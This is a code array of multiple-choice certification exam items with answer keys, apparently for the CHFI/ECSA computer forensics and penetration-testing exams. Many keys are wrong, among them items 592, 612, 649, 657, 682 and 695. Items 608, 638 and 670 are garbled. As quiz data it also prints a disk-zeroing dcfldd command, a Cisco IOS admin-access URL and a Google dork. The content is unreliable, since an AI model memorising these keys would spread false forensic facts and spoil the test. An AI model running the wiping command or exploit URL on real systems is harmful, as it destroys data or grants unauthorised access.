    options: [
      "Group Descriptor",
      "Inode Bit Map",
      "Super Block",
      "Inode Table",
    ],
    correctAnswer: 2,
  },
  {
    id: 574,
    question:
      "Email archiving is a systematic approach to save and protect the data contained in emails so that it can be accessed fast at a later date. There are two main archive types, namely Local Archive and Server Storage Archive. Which of the following statements is correct while dealing with local archives?",
    options: [
      "Local archives do not have evidentiary values as the email client may alter the message data",
      "Local archives should be stored together with the server storage archives in order be admissible in a court of law",
      "Server storage archives are the server information and settings stored in a local system, whereas the local archives are the local email client information stored on the mail server",
      "It is difficult to deal with the webmail as there is no offline archive in most cases. So consult your counsel on the case as to the best way to approach and gain access to the required data on servers",
    ],
    correctAnswer: 3,
  },
  {
    id: 575,
    question:
      "In a MYSQL DBMS, which uses MYISAM storage engine, the databases are stored as folders in the data directory and all the database tables are stored as files inside the database folders. These files carry the name of the tables and are categorized into specific file types (e.g., .myd, .myi, etc.). Which file type represents the table format?",
    options: [".ibd", ".myi", ".myf", ".frm"],
    correctAnswer: 3,
  },
  {
    id: 576,
    question:
      "Which of the following is a responsibility of the first responder?",
    options: [
      "Share the collected information to determine the root cause",
      "Document the findings",
      "Collect as much information about the incident as possible",
      "Determine the severity of the incident",
    ],
    correctAnswer: 2,
  },
  {
    id: 577,
    question:
      "Smith, as a part his forensic investigation assignment, seized a mobile device. He was asked to recover the Subscriber Identity Module (SIM) card data in the mobile device. Smith found that the SIM was protected by a Personal Identification Number (PIN) code, but he was also aware that people generally leave the PIN numbers to the defaults or use easily guessable numbers such as 1234. He made three unsuccessful attempts, which blocked the SIM card. What can Jason do in this scenario to reset the PIN and access SIM data?",
    options: [
      "He should contact the network operator for a Temporary Unlock Code (TUK)",
      "Use system and hardware tools to gain access",
      "He can attempt PIN guesses after 24 hours",
      "He should contact the network operator for Personal Unlock Number (PUK)",
    ],
    correctAnswer: 3,
  },
  {
    id: 578,
    question:
      "Identify the NIST Publication that provides the required guidelines to help organizations to sanitize data to preserve the confidentiality of the information.",
    options: [
      "NIST SP 800-88",
      "NIST SP 800-89",
      "NIST SP 800-90",
      "NIST SP 800-87",
    ],
    correctAnswer: 0,
  },
  {
    id: 579,
    question:
      "Which of these files helps a forensics investigator to locate the start-up files created by a malware infection on a Linux system?",
    options: [
      "Rc.config file",
      "Rc.vimrc file",
      "Rc.local file",
      "Rc.cache file",
    ],
    correctAnswer: 2,
  },
  {
    id: 580,
    question:
      "Casey has acquired data from a hard disk in an open source acquisition format that allows her to generate compressed or uncompressed image files. What format did she use?",
    options: [
      "Portable Document Format",
      "Advanced Forensics Format (AFF)",
      "Proprietary Format",
      "Raw Format",
    ],
    correctAnswer: 1,
  },
  {
    id: 581,
    question: "Which of the following is a MAC-based File Recovery Tool?",
    options: [
      "GetDataBack",
      "Cisdem DataRecovery 3",
      "VirtualLab",
      "Smart Undeleter",
    ],
    correctAnswer: 1,
  },
  {
    id: 582,
    question:
      "In Steganalysis, which of the following describes a Known-stego attack?",
    options: [
      "The hidden message and the corresponding stego-image are known",
      "During the communication process, active attackers can change cover",
      "Original and stego-object are available and the steganography algorithm is known",
      "Only the steganography medium is available for analysis",
    ],
    correctAnswer: 2,
  },
  {
    id: 583,
    question:
      "Which of the following registry hive gives the configuration information about which application was used to open various files on the system?",
    options: [
      "HKEY_CLASSES_ROOT",
      "HKEY_CURRENT_CONFIG",
      "HKEY_LOCAL_MACHINE",
      "HKEY_USERS",
    ],
    correctAnswer: 0,
  },
  {
    id: 584,
    question:
      "Which US law does the interstate or international transportation and receiving of child pornography fall under?",
    options: [
      "§18. U.S.C 252",
      "§18. U.S.C 466A",
      "§18. U.S.C 2252",
      "§18. U.S.C 146A",
    ],
    correctAnswer: 2,
  },
  {
    id: 585,
    question:
      "An investigator has acquired packed software and needed to analyze it for the presence of malice. Which of the following tools can help in finding the packaging software used?",
    options: [
      "SysAnalyzer",
      "PEiD",
      "Comodo Programs Manager",
      "Dependency Walker",
    ],
    correctAnswer: 1,
  },
  {
    id: 587,
    question:
      "Windows identifies which application to open a file with by examining which of the following?",
    options: [
      "The File extension",
      "The file attributes",
      "The file Signature at the end of the file",
      "The file signature at the beginning of the file",
    ],
    correctAnswer: 0,
  },
  {
    id: 589,
    question:
      "You have completed a forensic investigation case. You would like to destroy the data contained in various disks at the forensics lab due to sensitivity of the case. How would you permanently erase the data on the hard disk?",
    options: [
      "Throw the hard disk into the fire",
      "Run the powerful magnets over the hard disk",
      "Format the hard disk multiple times using a low level disk utility",
      "Overwrite the contents of the hard disk with Junk data",
    ],
    correctAnswer: 0,
  },
  {
    id: 591,
    question:
      "On Linux/Unix based Web servers, what privilege should the daemon service be run under?",
    options: [
      "Guest",
      "Root",
      "You cannot determine what privilege runs the daemon service",
      "Something other than root",
    ],
    correctAnswer: 3,
  },
  {
    id: 592,
    question:
      "You are working as an independent computer forensics investigator and received a call from a systems administrator for a local school system requesting your assistance. One of the students at the local high school is suspected of downloading inappropriate images from the Internet to a PC in the Computer lab. When you arrive at the school, the systems administrator hands you a hard drive and tells you that he made a “simple backup copy” of the hard drive in the PC and put it on this drive and requests that you examine that drive for evidence of the suspected images. You inform him that a “simple backup copy” will not provide deleted files or recover file fragments. What type of copy do you need to make to ensure that the evidence found is complete and admissible in future proceeding?",
    options: [
      "Bit-stream Copy",
      "Robust Copy",
      "Full backup Copy",
      "Incremental Backup Copy",
    ],
    correctAnswer: 2,
  },
  {
    id: 593,
    question:
      "A packet is sent to a router that does not have the packet destination address in its route table. How will the packet get to its proper destination?",
    options: [
      "Root Internet servers",
      "Border Gateway Protocol",
      "Gateway of last resort",
      "Reverse DNS",
    ],
    correctAnswer: 2,
  },
  {
    id: 594,
    question:
      "You are working as a Computer forensics investigator for a corporation on a computer abuse case. You discover evidence that shows the subject of your investigation is also embezzling money from the company. The company CEO and the corporate legal counsel advise you to contact law enforcement and provide them with the evidence that you have found. The law enforcement officer that responds requests that you put a network sniffer on your network and monitor all traffic to the subject’s computer. You inform the officer that you will not be able to comply with that request because doing so would:",
    options: [
      "Violate your contract",
      "Cause network congestion",
      "Make you an agent of law enforcement",
      "Write information to the subject’s hard drive",
    ],
    correctAnswer: 2,
  },
  {
    id: 595,
    question:
      "When reviewing web logs, you see an entry for resource not found in the HTTP status code field. What is the actual error code that you would see in the log for resource not found?",
    options: ["202", "404", "505", "909"],
    correctAnswer: 1,
  },
  {
    id: 596,
    question:
      "Preparing an image drive to copy files to is the first step in Linux forensics. For this purpose, what would the following command accomplish? dcfldd if=/dev/zero of=/dev/hda bs=4096 conv=noerror, sync",
    options: [
      "Fill the disk with zeros",
      "Low-level format",
      "Fill the disk with 4096 zeros",
      "Copy files from the master disk to the slave disk on the secondary IDE controller",
    ],
    correctAnswer: 0,
  },
  {
    id: 597,
    question: "How many times can data be written to a DVD+R disk?",
    options: ["Twice", "Once", "Zero", "Infinite"],
    correctAnswer: 1,
  },
  {
    id: 598,
    question:
      "When making the preliminary investigations in a sexual harassment case, how many investigators are you recommended having?",
    options: ["One", "Two", "Three", "Four"],
    correctAnswer: 1,
  },
  {
    id: 600,
    question:
      "What will the following command accomplish? dd if=/dev/xxx of=mbr.backup bs=512 count=1",
    options: [
      "Back up the master boot record",
      "Restore the master boot record",
      "Mount the master boot record on the first partition of the hard drive",
      "Restore the first 512 bytes of the first partition of the hard drive",
    ],
    correctAnswer: 0,
  },
  {
    id: 601,
    question:
      "What stage of the incident handling process involves reporting events?",
    options: ["Containment", "Follow-up", "Identification", "Recovery"],
    correctAnswer: 2,
  },
  {
    id: 603,
    question:
      "Which of the following is a record of the characteristics of a file system, including its size, the block size, the empty and the filled blocks and their respective counts, the size and location of the inode tables, the disk block map and usage information, and the size of the block groups?",
    options: [
      "Inode bitmap block",
      "Superblock",
      "Block bitmap block",
      "Data block",
    ],
    correctAnswer: 1,
  },
  {
    id: 604,
    question: "Software firewalls work at which layer of the OSI model?",
    options: ["Application", "Network", "Transport", "Data Link"],
    correctAnswer: 0,
  },
  {
    id: 605,
    question:
      "What term is used to describe a cryptographic technique for embedding information into something else for the sole purpose of hiding that information from the casual observer?",
    options: ["rootkit", "key escrow", "steganography", "Offset"],
    correctAnswer: 2,
  },
  {
    id: 606,
    question:
      "You are working as Computer Forensics investigator and are called by the owner of an accounting firm to investigate possible computer abuse by one of the firm’s employees. You meet with the owner of the firm and discover that the company has never published a policy stating that they reserve the right to inspect their computing assets at will. What do you do?",
    options: [
      "Inform the owner that conducting an investigation without a policy is not a problem because the company is privately owned",
      "Inform the owner that conducting an investigation without a policy is a violation of the 4th amendment",
      "Inform the owner that conducting an investigation without a policy is a violation of the employee’s expectation of privacy",
      "Inform the owner that conducting an investigation without a policy is not a problem because a policy is only necessary for government agencies",
    ],
    correctAnswer: 2,
  },
  {
    id: 608,
    question:
      "Under which Federal Statutes does FBI investigate for computer crimes involving e-mail scams and mail fraud?",
    options: [
      "18 U.S.",
      "1029 Possession of Access Devices",
      "18 U.S.",
      "1030 Fraud and related activity in connection with computers",
      "18 U.S.",
      "1343 Fraud by wire, radio or television",
      "18 U.S.",
      "1361 Injury to Government Property",
      "18 U.S.",
      "1362 Government communication systems",
      "18 U.S.",
      "1831 Economic Espionage Act",
      "18 U.S.",
      "1832 Trade Secrets Act",
    ],
    correctAnswer: 3,
  },
  {
    id: 609,
    question:
      "Simon is a former employee of Trinitron XML Inc. He feels he was wrongly terminated and wants to hack into his former company's network. Since Simon remembers some of the server names, he attempts to run the axfr and ixfr commands using DIG. What is Simon trying to accomplish here?",
    options: [
      "Send DOS commands to crash the DNS servers",
      "Perform DNS poisoning",
      "Perform a zone transfer",
      "Enumerate all the users in the domain",
    ],
    correctAnswer: 2,
  },
  {
    id: 610,
    question:
      "In conducting a computer abuse investigation you become aware that the suspect of the investigation is using ABC Company as his Internet Service Provider (ISP). You contact ISP and request that they provide you assistance with your investigation. What assistance can the ISP provide?",
    options: [
      "The ISP can investigate anyone using their service and can provide you with assistance",
      "The ISP can investigate computer abuse committed by their employees, but must preserve the privacy of their customers and therefore cannot assist you without a warrant",
      "The ISP can't conduct any type of investigations on anyone and therefore can't assist you",
      "ISP's never maintain log files so they would be of no use to your investigation",
    ],
    correctAnswer: 1,
  },
  {
    id: 611,
    question:
      "In Microsoft file structures, sectors are grouped together to form:",
    options: ["Clusters", "Drives", "Bitstreams", "Partitions"],
    correctAnswer: 0,
  },
  {
    id: 612,
    question:
      "If you plan to startup a suspect's computer, you must modify the to ensure that you do not contaminate or alter data on the suspect's hard drive by booting to the hard drive.",
    options: ["deltree command", "CMOS", "Boot.sys", "Scandisk utility"],
    correctAnswer: 2,
  },
  {
    id: 614,
    question:
      "Melanie was newly assigned to an investigation and asked to make a copy of all the evidence from the compromised system. Melanie did a DOS copy of all the files on the system. What would be the primary reason for you to recommend a disk imaging tool?",
    options: [
      "A disk imaging tool would check for CRC32s for internal self-checking and validation and have MD5 checksum",
      "Evidence file format will contain case data entered by the examiner and encrypted at the beginning of the evidence file",
      "A simple DOS copy will not include deleted files, file slack and other information",
      "There is no case for an imaging tool as it will use a closed, proprietary format that if compared to the original will not match up sector for sector",
    ],
    correctAnswer: 2,
  },
  {
    id: 615,
    question:
      "What method of computer forensics will allow you to trace all ever-established user accounts on a Windows 2000 server the course of its lifetime?",
    options: [
      "forensic duplication of hard drive",
      "analysis of volatile data",
      "comparison of MD5 checksums",
      "review of SIDs in the Registry",
    ],
    correctAnswer: 2,
  },
  {
    id: 617,
    question:
      "You should make at least how many bit-stream copies of a suspect drive?",
    options: ["1", "2", "3", "4"],
    correctAnswer: 1,
  },
  {
    id: 618,
    question:
      "Jessica works as systems administrator for a large electronics firm. She wants to scan her network quickly to detect live hosts by using ICMP ECHO Requests. What type of scan is Jessica going to perform?",
    options: ["Tracert", "Smurf scan", "Ping trace", "ICMP ping sweep"],
    correctAnswer: 3,
  },
  {
    id: 619,
    question: "To preserve digital evidence, an investigator should .",
    options: [
      "Make two copies of each evidence item using a single imaging tool",
      "Make a single copy of each evidence item using an approved imaging tool",
      "Make two copies of each evidence item using different imaging tools",
      "Only store the original evidence item",
    ],
    correctAnswer: 2,
  },
  {
    id: 620,
    question:
      "_______ is simply the application of Computer Investigation and analysis techniques in the interests of determining potential legal evidence.",
    options: [
      "Network Forensics",
      "Computer Forensics",
      "Incident Response",
      "Event Reaction",
    ],
    correctAnswer: 1,
  },
  {
    id: 621,
    question:
      'What are the security risks of running a "repair" installation for Windows XP?',
    options: [
      "Pressing Shift+F10 gives the user administrative rights",
      "Pressing Shift+F1 gives the user administrative rights",
      "Pressing Ctrl+F10 gives the user administrative rights",
      'There are no security risks when running the "repair" installation for Windows XP',
    ],
    correctAnswer: 0,
  },
  {
    id: 622,
    question:
      "Julia is a senior security analyst for Berber Consulting group. She is currently working on a contract for a small accounting firm in Florida. They have given her permission to perform social engineering attacks on the company to see if their in-house training did any good. Julia calls the main number for the accounting firm and talks to the receptionist. Julia says that she is an IT technician from the company's main office in Iowa. She states that she needs the receptionist's network username and password to troubleshoot a problem they are having. Julia says that Bill Hammond, the CEO of the company, requested this information. After hearing the name of the CEO, the receptionist gave Julia all the information she asked for. What principal of social engineering did Julia use?",
    options: [
      "Social Validation",
      "Scarcity",
      "Friendship/Liking",
      "Reciprocation",
    ],
    correctAnswer: 3,
  },
  {
    id: 623,
    question:
      "Jonathan is a network administrator who is currently testing the internal security of his network. He is attempting to hijack a session, using Ettercap, of a user connected to his Web server. Why will Jonathan not succeed?",
    options: [
      "Only an HTTPS session can be hijacked",
      "HTTP protocol does not maintain session",
      "Only FTP traffic can be hijacked",
      "Only DNS traffic can be hijacked",
    ],
    correctAnswer: 1,
  },
  {
    id: 624,
    question:
      "Kimberly is studying to be an IT security analyst at a vocational school in her town. The school offers many different programming as well as networking languages. What networking protocol language should she learn that routers utilize?",
    options: ["ATM", "UDP", "BGP", "OSPF"],
    correctAnswer: 3,
  },
  {
    id: 626,
    question:
      "After passively scanning the network of Department of Defense (DoD), you switch over to active scanning to identify live hosts on their network. DoD is a large organization and should respond to any number of scans. You start an ICMP ping sweep by sending an IP packet to the broadcast address. Only five hosts respond to your ICMP pings; definitely not the number of hosts you were expecting. Why did this ping sweep only produce a few responses?",
    options: [
      "Only IBM AS/400 will reply to this scan",
      "Only Windows systems will reply to this scan",
      "A switched network will not respond to packets sent to the broadcast address",
      "Only Unix and Unix-like systems will reply to this scan",
    ],
    correctAnswer: 3,
  },
  {
    id: 627,
    question:
      "You are a computer forensics investigator working with local police department and you are called to assist in an investigation of threatening emails. The complainant has printed out 27 email messages from the suspect and gives the printouts to you. You inform her that you will need to examine her computer because you need access to the in order to track the emails back to the suspect.",
    options: [
      "Routing Table",
      "Firewall log",
      "Configuration files",
      "Email Header",
    ],
    correctAnswer: 3,
  },
  {
    id: 628,
    question:
      "In what way do the procedures for dealing with evidence in a criminal case differ from the procedures for dealing with evidence in a civil case?",
    options: [
      "evidence must be handled in the same way regardless of the type of case",
      "evidence procedures are not important unless you work for a law enforcement agency",
      "evidence in a criminal case must be secured more tightly than in a civil case",
      "evidence in a civil case must be secured more tightly than in a criminal case",
    ],
    correctAnswer: 2,
  },
  {
    id: 629,
    question:
      "Harold is a security analyst who has just run the rdisk /s command to grab the backup SAM files on a computer. Where should Harold navigate on the computer to find the file?",
    options: [
      "%systemroot%\\system32\\LSA",
      "%systemroot%\\system32\\drivers\\etc",
      "%systemroot%\\repair",
      "%systemroot%\\LSA",
    ],
    correctAnswer: 2,
  },
  {
    id: 631,
    question:
      "Larry is an IT consultant who works for corporations and government agencies. Larry plans on shutting down the city's network using BGP devices and zombies? What type of Penetration Testing is Larry planning to carry out?",
    options: [
      "Router Penetration Testing",
      "DoS Penetration Testing",
      "Firewall Penetration Testing",
      "Internal Penetration Testing",
    ],
    correctAnswer: 1,
  },
  {
    id: 632,
    question:
      "You are contracted to work as a computer forensics investigator for a regional bank that has four 30 TB storage area networks that store customer data. What method would be most efficient for you to acquire digital evidence from this network?",
    options: [
      "create a compressed copy of the file with DoubleSpace",
      "create a sparse data copy of a folder or file",
      "make a bit-stream disk-to-image file",
      "make a bit-stream disk-to-disk file",
    ],
    correctAnswer: 2,
  },
  {
    id: 633,
    question: "How many bits is Source Port Number in TCP Header packet?",
    options: ["16", "32", "48", "64"],
    correctAnswer: 0,
  },
  {
    id: 635,
    question:
      "A(n) is one that's performed by a computer program rather than the attacker manually performing the steps in the attack sequence.",
    options: [
      "blackout attack",
      "automated attack",
      "distributed attack",
      "central processing attack",
    ],
    correctAnswer: 1,
  },
  {
    id: 636,
    question:
      "You are a security analyst performing a penetration test for a company in the Midwest. After some initial reconnaissance, you discover the IP addresses of some Cisco routers used by the company. You type in the following URL that includes the IP address of one of the routers: http://172.168.4.131/level/99/exec/show/config After typing in this URL, you are presented with the entire configuration file for that router. What have you discovered?",
    options: [
      "HTTP Configuration Arbitrary Administrative Access Vulnerability",
      "HTML Configuration Arbitrary Administrative Access Vulnerability",
      "Cisco IOS Arbitrary Administrative Access Online Vulnerability",
      "URL Obfuscation Arbitrary Administrative Access Vulnerability",
    ],
    correctAnswer: 0,
  },
  {
    id: 637,
    question:
      "In General, Involves the investigation of data that can be retrieved from the hard disk or other disks of a computer by applying scientific methods to retrieve the data.",
    options: [
      "Network Forensics",
      "Data Recovery",
      "Disaster Recovery",
      "Computer Forensics",
    ],
    correctAnswer: 3,
  },
  {
    id: 638,
    question: "What is the target host IP in the following command?",
    options: [
      "172.16.28.95",
      "10.10.150.1",
      "Firewalk does not scan target hosts",
      "This command is using FIN packets, which cannot scan target hosts",
    ],
    correctAnswer: 0,
  },
  {
    id: 639,
    question:
      "When using Windows acquisitions tools to acquire digital evidence, it is important to use a well-tested hardware write-blocking device to:",
    options: [
      "Automate Collection from image files",
      "Avoid copying data from the boot partition",
      "Acquire data from host-protected area on a disk",
      "Prevent Contamination to the evidence drive",
    ],
    correctAnswer: 3,
  },
  {
    id: 640,
    question:
      "You are trying to locate Microsoft Outlook Web Access Default Portal using Google search on the Internet. What search string will you use to locate them?",
    options: [
      'allinurl:"exchange/logon.asp"',
      'intitle:"exchange server"',
      'locate:"logon page"',
      'outlook:"search"',
    ],
    correctAnswer: 0,
  },
  {
    id: 641,
    question:
      "What is the name of the Standard Linux Command that is also available as a Windows application that can be used to create bit-stream images?",
    options: ["mcopy", "image", "MD5", "dd"],
    correctAnswer: 3,
  },
  {
    id: 642,
    question: "Diskcopy is:",
    options: [
      "a utility by AccessData",
      "a standard MS-DOS command",
      "Digital Intelligence utility",
      "dd copying tool",
    ],
    correctAnswer: 1,
  },
  {
    id: 643,
    question:
      "The refers to handing over the results of private investigations to the authorities because of indications of criminal activity.",
    options: [
      "Locard Exchange Principle",
      "Clark Standard",
      "Kelly Policy",
      "Silver-Platter Doctrine",
    ],
    correctAnswer: 3,
  },
  {
    id: 645,
    question:
      "This is original file structure database that Microsoft originally designed for floppy disks. It is written to the outermost track of a disk and contains information about each file stored on the drive.",
    options: [
      "Master Boot Record (MBR)",
      "Master File Table (MFT)",
      "File Allocation Table (FAT)",
      "Disk Operating System (DOS)",
    ],
    correctAnswer: 2,
  },
  {
    id: 646,
    question: "When obtaining a warrant, it is important to:",
    options: [
      "particularly describe the place to be searched and particularly describe the items to be seized",
      "generally describe the place to be searched and particularly describe the items to be seized",
      "generally describe the place to be searched and generally describe the items to be seized",
      "particularly describe the place to be searched and generally describe the items to be seized",
    ],
    correctAnswer: 0,
  },
  {
    id: 647,
    question:
      "As a CHFI professional, which of the following is the most important to your professional reputation?",
    options: [
      "Your Certifications",
      "The correct, successful management of each and every case",
      "The free that you charge",
      "The friendship of local law enforcement officers",
    ],
    correctAnswer: 1,
  },
  {
    id: 648,
    question:
      "When monitoring for both intrusion and security events between multiple computers, it is essential that the computers' clocks are synchronized. Synchronized time allows an administrator to reconstruct what took place during an attack against multiple computers. Without synchronized time, it is very difficult to determine exactly when specific events took place, and how events interlace. What is the name of the service used to synchronize time among multiple computers?",
    options: [
      "Universal Time Set",
      "Network Time Protocol",
      "SyncTime Service",
      "Time-Sync Protocol",
    ],
    correctAnswer: 1,
  },
  {
    id: 649,
    question:
      "What header field in the TCP/IP protocol stack involves the hacker exploit known as the Ping of Death?",
    options: [
      "ICMP header field",
      "TCP header field",
      "IP header field",
      "UDP header field",
    ],
    correctAnswer: 1,
  },
  {
    id: 650,
    question:
      "You just passed your ECSA exam and are about to start your first consulting job running security audits for a financial institution in Los Angeles. The IT manager of the company you will be working for tries to see if you remember your ECSA class. He asks about the methodology you will be using to test the company's network. How would you answer?",
    options: [
      "Microsoft Methodology",
      "Google Methodology",
      "IBM Methodology",
      "LPT Methodology",
    ],
    correctAnswer: 3,
  },
  {
    id: 652,
    question:
      "Which Federal Rule of Evidence speaks about the Hearsay exception where the availability of the declarant Is immaterial and certain characteristics of the declarant such as present sense Impression, excited utterance, and recorded recollection are also observed while giving their testimony?",
    options: ["Rule 801", "Rule 802", "Rule 804", "Rule 803"],
    correctAnswer: 3,
  },
  {
    id: 653,
    question:
      "A forensic analyst has been tasked with investigating unusual network activity Inside a retail company's network. Employees complain of not being able to access services, frequent rebooting, and anomalies in log files. The Investigator requested log files from the IT administrator and after carefully reviewing them, he finds the following log entry: What type of attack was performed on the companies' web application?",
    options: [
      "Directory transversal",
      "Unvalidated input",
      "Log tampering",
      "SQL injection",
    ],
    correctAnswer: 3,
  },
  {
    id: 657,
    question:
      "Which of the following is considered as the starting point of a database and stores user data and database objects in an MS SQL server?",
    options: [
      "Ibdata1",
      "Application data files (ADF)",
      "Transaction log data files (LDF)",
      "Primary data files (MDF)",
    ],
    correctAnswer: 2,
  },
  {
    id: 659,
    question:
      "A file requires 10 KB space to be saved on a hard disk partition. An entire cluster of 32 KB has been allocated for this file. The remaining, unused space of 22 KB on this cluster will be identified as .",
    options: ["Swap space", "Cluster space", "Slack space", "Sector space"],
    correctAnswer: 2,
  },
  {
    id: 665,
    question:
      "Donald made an OS disk snapshot of a compromised Azure VM under a resource group being used by the affected company as part of forensic analysis process. He then created a VHD file out of the snapshot and stored it in a file share and as a page blob as backup in a storage account under a different region. What is the next thing he should do as a security measure?",
    options: [
      "Recommend changing the access policies followed by the company",
      "Delete the snapshot from the source resource group",
      "Delete the OS disk of the affected VM altogether",
      "Create another VM by using the snapshot",
    ],
    correctAnswer: 2,
  },
  {
    id: 668,
    question:
      "An Investigator is checking a Cisco firewall log that reads as follows: Aug 21 2019 09:16:44: %ASA-1-106021: Deny ICMP reverse path check from 10.0.0.44 to 10.0.0.33 on Interface outside. What does %ASA-1-106021 denote?",
    options: [
      "Mnemonic message",
      "Type of traffic",
      "Firewall action",
      "Type of request",
    ],
    correctAnswer: 2,
  },
  {
    id: 670,
    question:
      "Steve received a mail that seemed to have come from her bank. The mail has instructions for Steve to click on a link and provide information to avoid the suspension of her account. The link in the mail redirected her to a form asking for details such as name, phone number, date of birth, credit card number or PIN, CW code, SSNs, and email address. On a closer look, Steve realized that the URL of the form is not the same as that of her bank's. Identify the type of external attack performed by the attacker in the above scenario?",
    options: ["Aphishing", "Espionage", "Tailgating", "Brute-force"],
    correctAnswer: 0,
  },
  {
    id: 672,
    question:
      "In a computer that has Dropbox client installed, which of the following files related to the Dropbox client store information about local Dropbox installation and the Dropbox user account, along with email IDs linked with the account?",
    options: ["config.db", "install.db", "sigstore.db", "filecache.db"],
    correctAnswer: 0,
  },
  {
    id: 673,
    question: "Data density of a disk drive is calculated by using",
    options: [
      "Slack space, bit density, and slack density.",
      "Track space, bit area, and slack space.",
      "Track density, areal density, and slack density.",
      "Track density, areal density, and bit density.",
    ],
    correctAnswer: 3,
  },
  {
    id: 674,
    question:
      "Which list contains the most recent actions performed by a Windows User?",
    options: ["MRU", "Activity", "Recents", "Windows Error Log"],
    correctAnswer: 0,
  },
  {
    id: 675,
    question: "What technique is used by JPEGs for compression?",
    options: ["TIFF-8", "ZIP", "DCT", "TCD"],
    correctAnswer: 2,
  },
  {
    id: 676,
    question:
      "An investigator has found certain details after analysis of a mobile device. What can reveal the manufacturer information?",
    options: [
      "Equipment Identity Register (EIR)",
      "Electronic Serial Number (ESN)",
      "International mobile subscriber identity (IMSI)",
      "Integrated circuit card identifier (ICCID)",
    ],
    correctAnswer: 1,
  },
  {
    id: 679,
    question: "What is cold boot (hard boot)?",
    options: [
      "It is the process of restarting a computer that is already in sleep mode",
      "It is the process of shutting down a computer from a powered-on or on state",
      "It is the process of restarting a computer that is already turned on through the operating system",
      "It is the process of starting a computer from a powered-down or off state",
    ],
    correctAnswer: 3,
  },
  {
    id: 680,
    question:
      "Which among the following U.S. laws requires financial institutions—companies that offer consumers financial products or services such as loans, financial or investment advice, or insurance—to protect their customers’ information against security threats?",
    options: ["SOX", "HIPAA", "GLBA", "FISMA"],
    correctAnswer: 2,
  },
  {
    id: 681,
    question: "What document does the screenshot represent?",
    options: [
      "Expert witness form",
      "Search warrant form",
      "Chain of custody form",
      "Evidence collection form",
    ],
    correctAnswer: 3,
  },
  {
    id: 682,
    question:
      "Ron, a computer forensics expert, is investigating a case involving corporate espionage. He has recovered several mobile computing devices from the crime scene. One of the evidence that Ron possesses is a mobile phone from Nokia that was left in ON condition. Ron needs to recover the IMEI number of the device to establish the identity of the device owner. Which of the following key combinations can he use to recover the IMEI number?",
    options: ["#*06#", "*#06#", "#06#*", "*IMEI#"],
    correctAnswer: 0,
  },
  {
    id: 683,
    question:
      "Smith is an IT technician that has been appointed to his company's network vulnerability assessment team. He is the only IT employee on the team. The other team members include employees from Accounting, Management, Shipping, and Marketing. Smith and the team members are having their first meeting to discuss how they will proceed. What is the first step they should do to create the network vulnerability assessment plan?",
    options: [
      "Their first step is to make a hypothesis of what their final findings will be.",
      "Their first step is to create an initial Executive report to show the management team.",
      "Their first step is to analyze the data they have currently gathered from the company or interviews.",
      "Their first step is the acquisition of required documents, reviewing of security policies and compliance.",
    ],
    correctAnswer: 3,
  },
  {
    id: 684,
    question:
      "As a Certified Ethical Hacker, you were contracted by a private firm to conduct an external security assessment through penetration testing. What document describes the specifics of the testing, the associated violations, and essentially protects both the organization’s interest and your liabilities as a tester?",
    options: [
      "Project Scope",
      "Rules of Engagement",
      "Non-Disclosure Agreement",
      "Service Level Agreement",
    ],
    correctAnswer: 1,
  },
  {
    id: 685,
    question: "Which one of the following is not a first response procedure?",
    options: [
      "Preserve volatile data",
      "Fill forms",
      "Crack passwords",
      "Take photos",
    ],
    correctAnswer: 2,
  },
  {
    id: 686,
    question:
      "Which of the following files store the MySQL database data permanently, including the data that had been deleted, helping the forensic investigator in examining the case and finding the culprit?",
    options: ["mysql-bin", "mysql-log", "iblog", "ibdata1"],
    correctAnswer: 3,
  },
  {
    id: 687,
    question:
      "A forensic examiner is examining a Windows system seized from a crime scene. During the examination of a suspect file, he discovered that the file is password protected. He tried guessing the password using the suspect’s available information but without any success. Which of the following tool can help the investigator to solve this issue?",
    options: ["Cain & Abel", "Xplico", "Recuva", "Colasoft’s Capsa"],
    correctAnswer: 0,
  },
  {
    id: 688,
    question:
      "Which of the following is a non-zero data that an application allocates on a hard disk cluster in systems running on Windows OS?",
    options: [
      "Sparse File",
      "Master File Table",
      "Meta Block Group",
      "Slack Space",
    ],
    correctAnswer: 1,
  },
  {
    id: 689,
    question:
      "In Linux OS, different log files hold different information, which help the investigators to analyze various issues during a security incident. What information can the investigators obtain from the log file var/log/dmesg?",
    options: [
      "Kernel ring buffer information",
      "All mail server message logs",
      "Global system messages",
      "Debugging log messages",
    ],
    correctAnswer: 0,
  },
  {
    id: 690,
    question:
      "A section of your forensics lab houses several electrical and electronic equipment. Which type of fire extinguisher you must install in this area to contain any fire incident?",
    options: ["Class B", "Class D", "Class C", "Class A"],
    correctAnswer: 2,
  },
  {
    id: 691,
    question:
      "Gill is a computer forensics investigator who has been called upon to examine a seized computer. This computer, according to the police, was used by a hacker who gained access to numerous banking institutions to steal customer information. After preliminary investigations, Gill finds in the computer’s log files that the hacker was able to gain access to these banks through the use of Trojan horses. The hacker then used these Trojan horses to obtain remote access to the companies’ domain controllers. From this point, Gill found that the hacker pulled off the SAM files from the domain controllers to then attempt and crack network passwords. What is the most likely password cracking technique used by this hacker to break the user passwords from the SAM files?",
    options: [
      "Syllable attack",
      "Hybrid attack",
      "Brute force attack",
      "Dictionary attack",
    ],
    correctAnswer: 3,
  },
  {
    id: 692,
    question:
      "Which of the following statements is incorrect when preserving digital evidence?",
    options: [
      "Verify if the monitor is in on, off, or in sleep mode",
      "Turn on the computer and extract Windows event viewer log files",
      "Remove the plug from the power router or modem",
      "Document the actions and changes that you observe in the monitor, computer, printer, or in other peripherals",
    ],
    correctAnswer: 1,
  },
  {
    id: 693,
    question:
      "Which U.S. law sets the rules for sending emails for commercial purposes, establishes the minimum requirements for commercial messaging, gives the recipients of emails the right to ask the senders to stop emailing them, and spells out the penalties in case the above said rules are violated?",
    options: [
      "NO-SPAM Act",
      "American: NAVSO P-5239-26 (RLL)",
      "CAN-SPAM Act",
      "American: DoD 5220.22-M",
    ],
    correctAnswer: 2,
  },
  {
    id: 694,
    question:
      "POP3 is an Internet protocol, which is used to retrieve emails from a mail server. Through which port does an email client connect with a POP3 server?",
    options: ["110", "143", "25", "993"],
    correctAnswer: 0,
  },
  {
    id: 695,
    question:
      "Consider that you are investigating a machine running an Windows OS released prior to Windows Vista. You are trying to gather information about the deleted files by examining the master database file named INFO2 located at C:\\Recycler\\<USER SID>\\. You read an entry named 'Dd5.exe'. What does Dd5.exe mean?",
    options: [
      "D drive",
      "fifth file deleted, a .exe file",
      "D drive, fourth file restored, a .exe file",
      "D drive, fourth file deleted, a .exe file",
      "D drive, sixth file deleted, a .exe file",
    ],
    correctAnswer: 1,
  },
  {
    id: 697,
    question:
